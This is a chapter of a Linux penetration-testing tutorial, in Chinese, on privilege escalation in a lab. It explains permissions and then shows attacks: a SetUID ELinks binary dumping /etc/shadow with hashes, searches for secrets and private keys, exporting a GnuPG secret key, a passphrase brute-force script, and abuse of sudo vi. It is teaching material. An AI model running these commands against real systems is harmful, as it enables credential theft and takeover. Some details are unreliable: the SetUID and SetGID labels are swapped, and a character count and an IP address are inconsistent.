

# 第九章：9 权限提升



![](img/opener.jpg)

在本章中，你将了解各种意外的系统配置错误和缺乏强化措施如何帮助你在被攻陷的主机上提升权限。我们将探讨 Linux 操作系统如何授予权限，检查系统的 sudo 和 PATH 配置，自动化搜索敏感文件，操控易受攻击的 cron 作业，攻击系统账户，发现内核漏洞等内容。

## 什么是权限提升？

*权限提升* 发生在低权限用户通过滥用配置错误、接管其他账户或利用其他漏洞，能够执行超出当前用户身份权限范围的特权操作时。这是攻击链中的一个重要阶段，因为低权限账户限制了你在系统上可以执行的操作。以下是攻击者可能采取的操作示例，但这些操作通常是非 root 用户所禁止的：

+   阅读可能包含敏感信息的系统文件

+   在特权系统位置创建文件和文件夹

+   创建额外的系统用户或修改现有用户

+   修改或删除敏感文件，如日志文件

+   安装系统范围的软件包

+   修改服务的配置

+   启用、禁用或重启服务

当然，如果系统存在配置错误，我们可能能够从低权限账户执行这些操作。例如，如果目录的权限设置错误，我们可能能够写入该目录；或者如果敏感文件被复制到所有系统用户都能访问的路径，并且继承了新位置的权限，我们可能能够读取该文件。

有许多条件可以导致权限提升：配置错误、缺乏系统强化、糟糕的软件设计、对环境的假设等等。以下是可能导致权限提升的技术和理论示例：

+   使用易受攻击的软件包或内核版本

+   在危险的实用程序或进程上授予过于宽松的权限

+   使用特权上下文运行应用程序，例如 root 用户

+   假设所有用户都可以被信任

+   将重复使用的凭据存储在所有用户都可以访问的文件中

## Linux 文件和目录权限

每个文件和目录都有由读取（r）、写入（w）和执行（x）权限组成的配置。此外，每个文件和目录都有一个用户和一个组作为所有者。如你在前一章所学，Linux 在 */etc/passwd* 中定义用户，在 */etc/group* 中定义组。管理员为特定用户、特定组和其他任何人（也叫做 *others*）授予权限。

文件和目录的权限和所有权可能会因配置错误而不小心被更改或*变得松散*，这意味着这些资源有可能暴露给未经授权的用户。因此，在进行渗透测试时，发现这些配置错误非常重要。

### 查看权限

让我们以*/etc/passwd*文件的权限和所有权分配为例。我们将从左到右查看输出的加粗部分：

```
$ **ls -l /etc/passwd**

**-rw-r--r--**1 **root root** 1341 Jun 28 01:11 /etc/passwd 
```

第一个字符表示资源的类型。连字符（-）表示文件，而字母 d 则表示目录。

接下来，rw-表示文件所有者的权限。在这种情况下，权限设置为读取（r）和写入（w）。最后一个连字符是执行（x）权限的占位符，此处未设置该权限。

下一组权限（r--）属于组，仅表示读取权限。其他用户也仅具有读取权限。两次出现的 root 表示文件所有者和组的身份：*root*用户和 root 组。图 9-1 以简明的方式展示了这一权限分解。

![](img/pg203.jpg)

图 9-1：基本文件权限

实际上，这些权限意味着所有本地帐户都可以读取文件，但只有*root*用户可以修改它。

### 设置权限

我们使用 chmod 命令设置 Linux 文件和目录权限，使用 chown 命令设置文件和目录的所有权。为了演示这些命令的使用，您可以在 Kali 机器上创建一个名为*my_new_file.txt*的空文件：

```
$ **cd ~**
$ **touch my_new_file.txt** 
```

接下来，将该文件的用户和组设置为*kali*：

```
$ **chown kali:kali my_new_file.txt**
```

现在为用户设置读取、写入和执行权限（u+rwx），为组设置读取权限（g+r），为其他人设置读取权限（o+r）：

```
$ **chmod u+rwx,g+r,o+r my_new_file.txt**
$ **ls -l my_new_file.txt**

-rwxr--r-- 1 kali kali 0 Jun 27 22:28 my_new_file.txt 
```

我们还可以通过使用*八进制表示法*来表示文件和目录的权限（但不包括所有权），该表示法使用数字 0 到 7。我们为用户、组和其他人分别设置一个数字，生成类似 777、700 或 440 的值。权限对应以下八进制值：

+   读取（r）权限是 4。

+   写入（w）权限是 2。

+   执行（x）权限是 1。

+   无权限的值为 0。

如果我们想授予所有人（即用户所有者、组和其他人）读取、写入和执行权限，我们需要将三个权限数字相加。读取（4）、写入（2）和执行（1）相加等于 7。这意味着，如果设置权限为 777，所有人都会获得读取、写入和执行权限。

如果我们只想授予用户读取权限，但拒绝组和其他人的访问权限，应该怎么做呢？以下是实现这一点的示例：

```
$ **chmod 400 my_new_file.txt**
$ **ls -l my_new_file.txt**

-r-------- 1 kali kali 0 Jun 27 22:30 my_new_file.txt 
```

我们使用八进制值 400，因为 4 授予用户读取权限，两个 0 值为组和其他人设置了零权限。

### 创建文件访问控制列表

我们已经介绍了文件和目录权限以及所有权的基础知识，但还有一些其他安全机制也可以授予或阻止用户访问。

*文件访问控制列表（ACLs）*允许你在文件和目录上设置更细粒度的额外权限。例如，假设我们有一个名为*sysadmins*的组，其中包含几个成员，如 Alice、Bob 和 Eve，我们需要授予 Alice 和 Bob 访问权限，但不授予 Eve。将 sysadmins 组设置在文件或目录上将使所有成员都可以访问。ACL 允许我们在现有权限方案的基础上授予或拒绝特定用户的访问权限。

下一个示例假设你有一个名为*sysadmins*的组和名为 Alice、Bob 和 Eve 的系统用户。你可以使用以下命令来创建这些资源：

```
$ **sudo groupadd sysadmins**
$ **sudo useradd eve -G sysadmins**
$ **sudo useradd alice -G sysadmins**
$ **sudo useradd bob -G sysadmins** 
```

接下来，让我们创建一个新的空文件并观察其默认 ACL。我们使用 getfacl 命令来实现这一点：

```
$ **touch facl_example.txt**
$ **getfacl facl_example.txt**

# file: facl_example.txt
# owner: kali
# group: kali

user::rw-
group::r--
other::r-- 
```

现在我们将授予*sysadmins*组读取权限，以确保 Alice 和 Bob，作为组成员，可以访问它：

```
$ **touch facl_example.txt**
$ **setfacl -m g:sysadmins:r-- facl_example.txt** 
```

我们传递 modify（-m）标志给 setfacl，以便它修改权限，接着是组名、所需权限（g:sysadmins:r--）以及目标文件或目录。

此时，所有组成员都可以读取该文件。我们现在如何排除特定用户呢？运行以下命令以删除 Eve 的所有权限：

```
$ **setfacl -m u:eve:--- facl_example.txt**
```

再次列出 ACL 权限，应该会显示 Eve 无法访问该文件：

```
$ **getfacl facl_example.txt**

# file: facl_example.txt
# owner: kali
# group: kali

user::rwx
user:eve:---
group::r--
group:sysadmins:r--
mask::r--
other::r-- 
```

当文件或目录设置了 ACL 时，Linux 在查看文件权限时会显示一个加号（+）：

```
-rw-r--r--**+** 1 kali kali    0 Jun 27 22:52 facl_example.txt
```

需要注意的是，这种安全控制是可用的。

### 查看 SetUID 和 SetGID

*Set 用户 ID（SetUID）*是一种特殊权限，可以在可执行文件上设置。它允许可执行文件以拥有该可执行文件的用户权限运行。例如，假设一个脚本允许系统上的用户删除*/var/log*路径中的日志文件。为了在不授予 root 权限的情况下允许用户这样做，系统管理员可以在可执行文件上设置 SetUID 位。同样，*Set 组 ID（SetGID）*权限允许用户以拥有组的权限运行可执行文件。

当可执行文件设置了 SetUID 或 SetGID 时，你会看到文件权限中会出现 s 而不是 x。一个同时使用 SetUID 和 SetGID 的文件是 At 调度器二进制文件*/usr/bin/at*，我们在第八章中使用 at 命令进行任务调度时使用了它。运行以下命令以查看 SetUID 和 SetGID：

```
$ **ls -l /usr/bin/at**

-rw**s**r-**s**r-x 1 daemon daemon 59768 Oct 15 /usr/bin/at 
```

在这里，你可以看到 SetUID 已经设置，这可以从权限中的第一个 s 看到，接着是 SetGID，可以从第二个 s 看到。因此，当用户运行 at 命令时，他们以*daemon*用户和组的权限运行。

另一个使用 SetUID 设置其可执行文件的命令示例是 passwd，它用于更改账户密码。设置了 SetUID 和 SetGID 的可执行文件可能存在安全风险，是特权提升的主要目标。我们将在“利用 SetUID 配置错误”中展示一个攻击示例，见第 208 页。

### 设置粘滞位

当在目录上设置*粘滞位*时，即使文件的权限允许删除，其他用户或用户组也无法删除该目录下的文件，除非他们拥有该文件。设置了粘滞位的目录的一个典型例子是*/tmp*。运行以下命令查看它：

```
$ **ls -ld /tmp**

drwxrwxrw**t** 11 root root 4096 Jun 28 21:58 /tmp 
```

t 表示该目录上设置了粘滞位。要在目录上设置粘滞位，请运行以下命令：

```
$ **mkdir /tmp/test**
$ **chmod +t /tmp/test**
$ **ls -ld /tmp/test**

drwxr-xr-t 2 kali kali 4096 Jun 28 22:06 /tmp/test 
```

你还可以通过八进制表示法设置 SetUID、SetGID 或粘滞位，在权限前添加一个额外的数字：粘滞位为 1，SetGID 为 2，SetUID 为 4。为了演示这一点，让我们从系统中复制一个二进制文件并更改其权限。将*ping*二进制文件复制到*/tmp*目录，并命名为*ping.backup*：

```
$ **cp /usr/bin/ping /tmp/ping.backup**
$ **ls -l /tmp/ping.backup**

-rwxr-xr-x 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup 
```

接下来，将文件的八进制权限标注设置为 4700：

```
$ **chmod 4700 /tmp/ping.backup**

$ **ls -l /tmp/ping.backup**

-rws------ 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup 
```

这设置了 SetUID（4），接着为用户所有者设置读、写和执行权限（700）。

## 基于权限查找文件

第八章介绍了 FHS，它旨在标准化 Linux 系统中某些文件和目录的位置。但是，文件无论是配置文件还是应用程序的源代码，都可以存放在几乎任何地方，因此理解哪些文件在当前权限上下文中是可以访问的非常重要。

幸运的是，查找可读、可写和可执行的文件和目录相当简单。像 find 这样的工具甚至可以根据权限定位文件。让我们来探索如何做到这一点。

要查找系统上每个人都可以读取的文件和目录（即*其他*），从根目录开始递归搜索，请使用以下命令：

```
$ **find / -perm -o=r**
```

要只查找文件，请传递-type f 标志；只查找目录，请传递-type d 标志：

```
$ **find / -type f -perm -o=r**
$ **find / -type d -perm -o=r** 
```

在搜索时，要抑制任何访问拒绝错误，可以将标准错误流传递到*/dev/null*：

```
$ **find / -perm -o=r 2> /dev/null**
```

要查找任何人都可以写入的文件和目录，请使用以下命令：

```
$ **find / -perm -o=w**
```

查找可执行文件和目录的方式遵循相同的模式。要搜索每个人都可以执行的文件和目录，请使用以下命令：

```
$ **find / -perm -o=x**
```

*可执行目录*这个术语可能会让人困惑，但本质上，在文件夹上设置可执行权限（x）允许用户进入该目录（例如，通过 cd 命令）。

你可以将这些命令组合成一个，例如如下所示：

```
$ **find / -type f -perm -o=rwx**
```

该命令查找所有全局可读、可写和可执行的文件。

find 命令还允许我们通过使用 -perm 标志来搜索特定的权限。我们可以利用这一点来搜索设置了 SetUID 或 SetGID 的文件。以下命令搜索 SetGID 文件：

```
$ **find / -perm -4000 2> /dev/null**
```

类似地，这个命令搜索 SetUID 文件：

```
$ **find / -perm -2000 2> /dev/null**
```

我们还可以找到设置了粘滞位标志的目录：

```
$ **find / -perm -1000 2> /dev/null**
```

在大多数 Linux 系统中，搜索这些特殊权限可能会得到结果，因为某些文件默认就设置了这些权限。了解这些文件非常重要，这样你就可以轻松区分默认的系统文件和被系统所有者修改过的文件。

## 利用 SetUID 配置错误

让我们利用一个设置了 SetUID 位的程序。在被攻破的机器上，进行系统范围的 SetUID 和 SetGID 文件搜索，然后进行互联网搜索，找出哪些文件应当设置这些标志，哪些文件配置错误。

你的搜索应该能找到*ELinks*，它是一个让用户直接从命令行浏览网站并以简单文本输出显示结果的网页浏览器。图 9-2 展示了使用 ELinks 浏览 Google 的样子。

![](img/pg209.jpg)

图 9-2：使用 ELinks 命令行网页浏览器浏览 Google

在*p-jumpbox-01*（172.16.10.13）的备份用户帐户上，你应该能找到位于*/usr/bin/elinks*的 ELinks 二进制文件。要验证是否设置了 SetUID，可以使用 ls 或 stat 命令：

```
$ **stat /usr/bin/elinks**

  File: /usr/bin/elinks
  Size: 1759424       Blocks: 3440       IO Block: 4096   regular file
Device: 0,57 Inode:  4763007             Links: 1
Access: **(4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)**
`--snip--` 
```

当我们运行 ELinks 时，它将在*root*上下文中执行，因此如果我们能让它做一些有趣的事，比如读取本地文件，我们应该能够访问仅限*root*用户访问的敏感文件。通过传递 --help 标志来探索 ELinks 的选项：

```
$ **elinks --help**

Usage: elinks [OPTION]... [URL]...
Options:
  -anonymous [0|1]      Restrict to anonymous mode
  -auto-submit [0|1]    Autosubmit first form
  -base-session <num>   Clone internal session with given ID
`--snip--` 
```

接下来，使用 -dump 1 标志来读取网站地址并将其打印到标准输出流：

```
$ **elinks https://google.com -dump 1**
```

ELinks 应该从网站解析数据，例如链接集合，并将其打印到终端。

我们如何利用这种行为呢？就像*http://*或*https://*协议允许我们从网站读取数据一样，*file:/// *协议允许网页浏览器读取本地系统上的文件。由于我们是以 root 用户身份运行，我们可以读取敏感路径，例如*/etc/shadow*，该文件存储密码的哈希值：

```
$ **elinks file:///etc/shadow -dump 1**

root:*:19523:0:99999:7::: daemon:*:19523:0:99999:7:::
jmartinez:$y$j9T$jHIwZ8SKS4GGK9GrHOHTu.$rOJY2gSlP6ZgN2IB0qoW0oBFgs6DWiBH
acroSQw8Ir7:19536:0:99999:7:::
dbrown:$y$j9T$hDNnbY/r00FC/jeE4BfCL1$6HbLxT8T7D6sUebz1T0fp0xdTjIjVoWjTLM
DMdiHZBD:19536:0:99999:7:::
ogarcia:$y$j9T$aiqqNSE8dqtvZ62otyoOB/$2mLRlxi4iSlJxV5qTjbqdKSVyc4aGFKtpz
pn4YjZNID:19536:0:99999:7:::
arodriguez:$y$j9T$htdo8u5CtRaOiHkFxx.s7/$lzBMPHzw96si.CI3eIFjJj0FfdqwgNH
efhya0VpQso.:19536:0:99999:7:::
`--snip--` 
```

需要注意的是，尽管我们滥用了 ELinks，但并没有利用 ELinks 本身的漏洞；相反，我们利用了一个众所周知的浏览器功能，配合 SetUID 位进行恶意操作。

## 寻找凭证

本节我们将讨论系统中可能包含凭证的敏感文件位置。即使是加密的凭证也可能很弱并且容易暴力破解，而且你可能会发现它们在多个服务器上使用。权限提升并不总是涉及高度复杂的漏洞利用；如果你发现凭证散落在磁盘上，你可能只需要登录到一个更强大的帐户。

### 密码和秘密

密码和秘密，如 API 密钥，可能会存储在系统的多个位置。管理员可能会运行包含其用户名和密码的命令，应用程序可能会将凭据记录在日志文件中，配置文件可能包含作为连接字符串一部分的凭据。搜索凭据的地方包括：

+   */etc* 目录下的配置文件

+   环境变量

+   日志文件

+   用户的历史文件

+   定时任务，如 cron 作业

+   使用 bash 或 Python 等语言编写的脚本文件

+   内存

+   启动配置文件

+   密钥环

+   系统文件，如 */etc/shadow*

有多种方法可以揭示这些秘密。我们可以使用 bash 递归地搜索密码模式，针对特定的文件和感兴趣的扩展名构建搜索，或手动检查敏感的文件系统区域。

让我们修改在“基于权限查找文件”一节中介绍的搜索技巧，查看感兴趣的特定文件名。例如，通过使用不区分大小写的 grep 过滤器，搜索包含 *password* 关键字的可读文件：

```
$ **find . -type f -exec grep -i password {} \;**
```

然后搜索包含诸如 *api_key*、*token* 和 *key* 之类的词汇的可读文件：

```
$ **find . -type f -exec grep -i "api_key\|token\|apitoken\|key" {} \;**
```

你也可以搜索具有特定扩展名的可读文件，如 *.hashes*、*.env* 和 *.credentials*：

```
$ **find . -type f -name "*.hashes" -o -name "*.env" -o -name "*.credentials"**
```

搜索硬编码的凭据而不产生误报是一门艺术，但你可以使用侦查阶段获得的数据或外部资源来构建更精细化的搜索模式。

其中一个资源是 Nuclei 提供的模板库存，用于在本地文件中查找有趣的数据（如密码、API 令牌和云账户 ID）：*[`github.com/projectdiscovery/nuclei-templates/tree/main/file/keys`](https://github.com/projectdiscovery/nuclei-templates/tree/main/file/keys)*。例如，*github-oauth-token.yaml* 模板搜索用于登录 GitHub 帐户的 GitHub 开放认证 (OAuth) 令牌：

```
id: github-oauth-token

info:
  name: Github OAuth Access Token
  author: tanq16
  severity: high
  tags: token,file,github

file:
  - extensions:
      - all

    extractors:
      - type: regex
        regex:
          **- "gho_.{36}"** 
```

此模板查找以字符序列 gho_ 开头，后跟 32 个字符的字符串。如果你不想使用 Nuclei，可以将这个正则表达式输入到 grep 搜索中：

```
$ **grep -E 'gho_.{36}' somefile.txt**
```

我们使用 grep -E 来指定基于正则表达式的过滤器。或者，你也可以使用 egrep，这是 grep 命令的包装器，底层会自动传递 -E 标志，方便使用：

```
$ **egrep 'gho_.{36}' somefile.txt**
```

你也可以传递 -R 标志来执行递归搜索：

```
$ **grep -R 'gho_.{36}' /some_directory**
```

这对于搜索具有大量文件的目录非常有用，例如 Web 应用的源代码目录。

### 私钥

私钥对渗透测试人员来说是一个巨大的资产。我们可以用它们连接到服务器，解密文件，执行中间人攻击等等。你可能会在受限文件夹中找到私钥，如 */root*，或在某个用户的家目录中，具体取决于其类型和所有者。

#### SSH 密钥

除非修改过，SSH 私钥通常命名为*id_rsa*，以 RSA 加密系统命名，或*id_dsa*，以数字签名算法（DSA）加密系统命名，没有扩展名。它们对应的公钥通常为*id_rsa.pub*或*id_dsa.pub*。通常，你会在每个用户账户的隐藏目录*.ssh*下找到 SSH 密钥。例如，如果使用 RSA 生成，用户 Eve 的 SSH 密钥将存储在*/home/eve/.ssh/id_rsa*和*/home/eve/.ssh/id_rsa.pub*。

SSH 私钥具有明确定义的文件结构，如下所示：

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqcqpBTfIwqwiFtOvM1DlTEplYuwYyrc4OBOBR2Wz6ItsX+cA/zV4
`--snip--`
-----END OPENSSH PRIVATE KEY----- 
```

这些密钥使用*隐私增强邮件 (PEM)*格式，这是一种用于存储和传输加密密钥的常见格式。PEM 以一个头部（BEGIN）开始，接着是密钥数据，最后是尾部（END）。以下是你可能在实际应用中看到的常见头部：

```
-----BEGIN SSH2 PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
-----BEGIN DSA PRIVATE KEY-----
-----BEGIN EC PRIVATE KEY----- 
```

在文件中递归搜索这些字符串是相当容易的。例如，看看这个 grep 命令：

```
$ **grep -R -- "-----BEGIN" /some_directory**
```

-R 选项会递归搜索，而在搜索模式 "-----BEGIN" 前的双短横线（--）表示参数的结束。这使我们能够轻松地搜索包含短横线的字符串，例如 PEM 头部中的字符串。

你也可以尝试搜索以下类型的密钥：ecdsa、ecdsa-sk、ed25519 和 ed25519-sk。更改密钥类型会改变生成的密钥的名称。对于 rcdsa，密钥的名称是*id_ecdsa*和*id_ecdsa.pub*，而对于 ed25519，密钥的名称是*id_ed25519*和*id_ed25519.pub*。

还需要查找*SSH 主机密钥*，即验证服务器身份的加密密钥。当 SSH 客户端连接到 SSH 服务器时，客户端会通过使用存储在客户端*known_hosts*文件中的公钥来验证服务器的身份。如果该公钥发生变化，SSH 客户端会生成一个警告，表示无法验证主机。

公共和私有 SSH 主机密钥通常存储在*/etc/ssh*目录下，并可能具有如下名称：*ssh_host_ecdsa_key*、*ssh_host_rsa_key*、*ssh_host_ed25519_key*、*ssh_host_ecdsa_key.pub*、*ssh_host_rsa_key.pub*或*ssh_host_ed25519_key.pub*。

这些密钥通常在服务器配置时自动生成，但也可以手动生成。泄露 SSH 主机密钥可能会使你能够在网络上冒充一个服务器。

#### PGP 密钥

*Pretty Good Privacy (PGP)* 是一种用于加密文件、电子邮件等的加密方案。像 SSH 密钥一样，PGP 私钥使用 PEM 格式。它们看起来像这样：

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
lQVYBGSeRngBDACyE/xXrs89ek7Qcrx0rpupVWkBwv5cZJX3SF64mUlmRWckEBMB
O8STBlgCVixH7pw5Ke0UPFwOInZMzqAYWuqHwr6MJOVYzhVeEJWIbnAH/7ioh0ti
`--snip--`
-----END PGP PRIVATE KEY BLOCK----- 
```

*GNU Privacy Guard (GnuPG)* 是 OpenPGP（在 RFC 4880 中定义）的一个实现，它提供了用于管理 PGP 密钥的命令行工具。它可以让你生成密钥、导入和导出密钥、验证签名等。

你可以使用 gpg 工具通过运行 gpg --generate-key 命令来生成一个 GnuPG 密钥。当用户使用 GnuPG 生成密钥时，它会将密钥存储在通常位于用户主目录下的名为*.gnupg*的隐藏目录中的密钥环中。（用户可以通过设置环境变量 GNUPGHOME，将密钥环的位置更改为其他目录位置。）

在此目录中，*~/.gnupg/private-keys-v1.d/*文件夹包含私钥，*~/.gnupg/trustdb.gpg*文件包含 GnuPG 信任数据库，*~/.gnupg/pubring.kbx*文件包含元数据。因此，你首先需要访问一个账户，才能列出该账户的密钥。

让我们从实验室的一台机器上导出 PGP 密钥。在*p-web-01*（172.16.10.10）上，运行以下命令：

```
$ **gpg --list-keys**
```

这应该输出任何用户可访问的 PGP 密钥，包括看起来属于服务器账户的密钥，*arodriguez@acme-infinity-servers.com*：

```
`--snip--`
/root/.gnupg/pubring.kbx
------------------------
pub   rsa3072

      9DD565D2BB63D9241ACF9F61671507A368BFDC40
uid           [ultimate] arodriguez@acme-infinity-servers.com
sub   rsa3072 [E] 
```

如果我们想窃取这个私钥，可以按照以下方式将其导出到文件：

```
$ **gpg --output private.pgp --armor --export-secret-key arodriguez@acme-infinity-servers.com**
```

--output private.pgp 参数将内容写入文件，--armor 将密钥以 ASCII 格式输出，--export-secret-key arodriguez@acme-infinity-servers.com 指定基于电子邮件地址导出的密钥。

然而，在某些情况下，这种导出可能会失败。原因是如果创建者在生成密钥时使用了密码短语，GnuPG 密钥可能会受到保护，此时你需要提供密码短语才能执行导出操作。在练习 16 中，我们将介绍通过使用 bash 绕过这种保护的方法。

#### 证书

在渗透测试的后渗透阶段，你有时可能会遇到通过加密通道传输数据的服务器。例如，Web 服务器可能通过 SSL 将 HTTP 数据发送给客户端。

像 Apache 或 nginx 这样的流行 Web 服务器通常将证书存储在*/etc/ssl/certs*中，将私钥存储在*/etc/ssl/private*中。证书通常以*.crt*为扩展名，而私钥以*.key*或*.pem*为扩展名。这些 PEM 文件可能仅包含公钥，或者它们可能存储整个证书链（包括私钥、公钥和根证书）。

如果你有访问 Apache 或 nginx 配置文件的权限，配置文件中列出的配置密钥通常会指向证书及其私钥的位置。我们在以下 nginx 配置文件中将这些密钥加粗显示：

```
server {
    listen              443 ssl;
    server_name         example.com;
 **ssl_certificate     example.com.rsa.crt;**
 **ssl_certificate_key example.com.rsa.key;**
} 
```

在启用了 HTTPS 的 Apache 网站配置中，这些密钥通常如下所示：

```
<VirtualHost *:443>
   ServerName example.com
   DocumentRoot /var/www/example.com

   SSLEngine on
 **SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt**
 **SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key**
</VirtualHost> 
```

你可以进行全系统搜索，查找 nginx 或 Apache 的配置文件，然后交叉检查密钥的位置，看看它们是否对你可访问。

代理也可以配置为使用 SSL。以下是 HAProxy 的示例配置文件，其中 PEM 文件的位置以粗体显示：

```
frontend www.example.com
  **bind *:443 ssl crt  /etc/haproxy/certs/example_com.pem**
  reqadd X-Forwarded-Proto:\ https
  default_backend backend_http 
```

执行负载均衡的 HAProxy 可能会定义几个后端服务器，每个服务器都有自己的证书文件：

```
backend web_servers
    balance roundrobin
 **server server1 10.0.1.3:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem**
 **server server2 10.0.1.4:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem** 
```

你可以根据*ca-file*参数识别这些文件。

练习 16：暴力破解 GnuPG 密钥密码短语

当 GnuPG 密钥启用了密码短语保护时，您无法在未提供密码短语的情况下导出密钥。不过，别担心；有一种 bash 风格的方法可以暴力破解密码短语。

列表 9-1 操作的是一个名为 *passphrases.txt* 的文件，该文件包含了一些可能的密码短语。它假设 GnuPG 密钥的 ID 为电子邮件 *identity@blackhatbash.com*。

gnupg_passphrase_bf.sh

```
#!/bin/bash
❶ KEY_ID="identity@blackhatbash.com"

❷ if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then
  echo "Could not find identity/key ID ${KEY_ID}"
  exit 1
fi

while read -r passphrase; do
  echo "Brute forcing with ${passphrase}..."
❸ if echo "${passphrase}" | gpg --batch \
                                --yes \
                                --pinentry-mode loopback \
                                --passphrase-fd 0 \
                                --output private.pgp \
                                --armor \
                                --export-secret-key "${KEY_ID}"; then
       echo "Passphrase is: ${passphrase}"
       echo "Private key is located at private.pgp"
       exit 0
  fi
done < passphrases.txt 
```

列表 9-1：暴力破解受保护的 GnuPG 私钥

在此脚本中，我们定义了一个名为 `KEY_ID` 的变量，用于指定我们要暴力破解的密钥 ID ❶。在 ❷，我们列出了所有可用的密钥，并使用 `grep` 查找要暴力破解的密钥 ID，以确保该密钥存在。然后，我们通过 while 循环逐行遍历 *passphrase.txt* 文件，回显密码短语 ❸，并将其作为输入传递给 gpg 命令。

该命令包含一系列重要参数，使我们能够以自动化的方式暴力破解密码短语。`--batch --yes` 标志允许 pgp 命令在无人值守的情况下执行，`--pinentry-mode loopback` 允许我们伪造密码输入，`--passphrase-fd 0` 使 pgp 从文件描述符零（标准输入流）读取密码短语，`--output` 将输出写入我们选择的文件，`--armor` 使用 ASCII 格式化导出的密钥，`--export-secret-key` 是用于导出密钥的标识符。

如果 pgp 命令返回的退出代码为零，表示密码短语有效，或者根本没有设置密码短语，此时我们退出。

> 注意

*您可以在此章节的脚本位于* [`github.com/dolevf/Black-Hat-Bash/blob/master/ch09`](https://github.com/dolevf/Black-Hat-Bash/blob/master/ch09)。

为了进一步利用这一漏洞并练习您的 bash 脚本编写，改进脚本以便它能够遍历所有可用的密钥身份，并逐一进行暴力破解。

## 检查 sudo 配置

`sudo` Linux 命令将用户权限提升为 root，而不授予该用户直接访问 root 账户的权限。假设您是服务器的管理员，并希望授予其他用户添加新防火墙规则的能力。虽然您可以直接将 root 账户密码交给他们，但这样做可能会导致安全问题。使用 `sudo`，您可以授予该用户运行某些命令的权限，比如 `iptables` 命令或类似 `tcpdump` 的工具，而不暴露 root 账户的密码。

从攻击者的角度来看，sudo 配置值得探索，因为配置错误可能会让您访问敏感资源。在 Kali 机器上，内置的 *kali* 用户默认具有 sudo 权限。您可以通过运行以下命令来测试：

```
$ **sudo -l**
```

然后，命令会提示您输入登录密码：

```
[sudo] password for kali:
Matching Defaults entries for kali on kali:
    env_reset, mail_badpass,
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User kali may run the following commands on kali:
    **(ALL : ALL) ALL** 
```

`-l` 标志列出当前用户的 sudo 权限。如您所见，用户具有 (ALL : ALL) ALL，这基本上意味着无限制的特权访问。

sudo 命令通过其配置文件*/etc/sudoers*可以授予精细化权限。以下是一些通过高级 sudo 配置可以实现的权限授予：

+   为特定用户或组授予 sudo 权限

+   仅为特定用户或组授予特定系统命令的 sudo 权限

+   仅为特定用户或组授予特定脚本的 sudo 权限

+   授予 sudo 权限，以便运行命令时无需用户输入密码

为了补充*/etc/sudoers*，*/etc/sudoers.d*目录可以存储独立的 sudo 配置文件。主*/etc/sudoers*文件可以通过使用@includedir 指令从此目录导入文件：

```
$ **sudo cat /etc/sudoers**

`--snip--`
@includedir /etc/sudoers.d 
```

请记住，*/etc/sudoers*只能由特权用户修改，并且只有*root*用户和 root 组可以读取：

```
$ **ls -ld /etc/sudoers**

-r--r----- 1 root root 1714 Feb 18 07:03 /etc/sudoers 
```

如果你能够写入此文件或目录*/etc/sudoers.d*，你应该能够为自己授予 root 权限；然而，默认情况下，你无法执行此操作。

在 Kali 中，*kali-trusted*组的任何成员都可以在不需要密码的情况下获得 sudo 访问权限，这在*/etc/sudoers.d/kali-grant-root*文件中定义：

```
$ **sudo cat /etc/sudoers.d/kali-grant-root**

# Allow members of group kali-trusted to execute any command without a
# password prompt.

**%kali-trusted   ALL=(ALL:ALL) NOPASSWD: ALL** 
```

由于*kali*用户不属于*kali-trusted*组，因此该用户具有 sudo 权限，但每次使用时都需要提供密码。

然而，*kali*用户属于*/etc/sudoers*中提到的*sudo*组。此组的成员将自动获得无限制的 sudo 访问权限，如下配置行所定义：

```
$ **sudo cat /etc/sudoers**
# Allow members of group sudo to execute any command.

%sudo    ALL=(ALL:ALL) ALL 
```

要查看*kali*用户所属的组列表，可以运行 groups 命令：

```
$ **groups**

kali adm dialout cdrom floppy **sudo** audio dip video plugdev users
netdev bluetooth scanner wireshark kaboxer vboxsf docker 
```

下面是一些可能导致权限提升场景的 sudo 配置示例：

+   系统可能会授予你在危险命令上的 sudo 权限，包括可能将你带入 root shell 的 shell 命令。

+   系统可能会在一个所有用户都可写的脚本上配置 sudo，允许未经授权的用户添加恶意命令，这些命令将以 root 权限执行。

+   含有大量用户的组可能被授予 sudo 权限，这会扩大攻击面并增加获得 sudo 访问权限的途径（因为你可以尝试利用每个 sudo 组成员）。

下一节将帮助你理解授予 sudo 访问权限的危险。

### 滥用文本编辑器技巧

让我们演示一个依赖于 sudo 访问权限的攻击。作为*p-jumpbox-01*（176.16.10.13）上的备份用户，运行 sudo -l 命令，并在提示时输入密码（*backup*）。然后查看该用户的 sudo 配置：

```
$ **sudo -l**

User backup may run the following commands on p-jumpbox-01:
    (ALL : ALL) /usr/bin/vi
    (ALL : ALL) /usr/bin/curl 
```

看起来我们已获得了 vi（一个文本编辑器）的 sudo 访问权限。为文本编辑器授予 sudo 权限看似无害，但实际上并非如此。

例如，我们可以将一个文件传递给 vi 命令，指示它写入该文件。当获得 sudo 访问权限时，我们可以写入任何文件，或者在系统仅对*root*用户可访问或可写的系统位置创建新文件。

让我们将一个文件写入一个普通用户通常无法访问的系统位置。请输入以下内容：

```
$ **sudo vi /etc/demo.txt**
```

应该会出现一个文本编辑器提示。按键盘上的 I 键，然后输入你喜欢的内容。完成后，按 ESC，再按 SHIFT-:。输入 wq! 并按 ENTER 保存文件并退出。你会注意到我们能够将文件写入 */etc* 目录，而该目录只有特权用户才能写入。同样地，我们可以编辑系统上的任何文件，例如 */etc/passwd* 和 */etc/shadow*，甚至直接插入应用程序后门。

为了利用这种访问权限，尝试将自己切换到 root shell。vi 允许在文本编辑器窗口内执行 bash 命令。当你在编程时需要执行 shell 命令以查看输出或查看脚本外的文件时，这个功能非常方便。

